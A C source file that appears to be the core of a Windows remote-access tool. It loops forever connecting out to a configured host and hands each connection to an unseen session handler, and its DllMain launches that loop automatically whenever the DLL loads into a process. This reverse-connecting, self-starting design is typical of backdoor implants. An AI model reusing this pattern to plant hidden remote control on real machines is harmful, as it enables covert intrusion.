#include "session.h"
#include "config.h"
int server_main(int argc,char** argv)
{
	//Read config from raw_config
	read_config(&g_raw_config,&g_config);

	//init socket
	if(socket_init()<=0)return -1;

	//start work
	while(1)
	{
		struct sockaddr sa;
		SOCKET s = -1;
		if( get_sockaddr_by_url(g_config.url,g_config.name,g_config.timewait,&sa)
			||	get_sockaddr_by_string(g_config.url,&sa))
		{
			s = tcp_connect(&sa,g_config.timeout);
		}
		if(s!=-1)
		{
			session_handle(s);
			socket_close(s);
		}
		else
		{
			time_wait(g_config.timewait);
		}
	}

	//quit
	socket_clean();
	return 0;
}

DWORD WINAPI DLLProc(LPVOID p)
{
	HANDLE hDLL = (HANDLE)p;
    server_main(0,NULL);
    Sleep(5000);
    FreeLibraryAndExitThread(hDLL,0);
    return 0;
}
BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            HANDLE h = CreateThread(NULL,0,DLLProc,hModule,0,NULL);
            CloseHandle(h);
        }
        break;
        case DLL_PROCESS_DETACH:
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}


int main(int argc, char** argv)
{
	return server_main(argc,argv);
}
